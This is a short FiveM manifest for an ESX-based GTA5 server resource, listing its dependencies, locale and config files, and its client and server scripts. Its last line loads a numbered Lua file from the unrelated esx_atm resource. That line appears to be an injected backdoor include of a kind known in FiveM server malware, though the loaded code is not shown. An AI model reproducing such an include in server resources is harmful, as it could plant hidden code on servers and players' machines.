fx_version 'adamant'
game 'gta5'

dependencies {
	'es_extended',
	'ft_libs'
}

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@es_extended/locale.lua',
	'locales/es.lua',
	'config.lua',
	'server/main.lua',
}

client_scripts {
	'@es_extended/locale.lua',
	'locales/es.lua',
	'config.lua',
	'client/main.lua',
}
client_script '@esx_atm/48706.lua'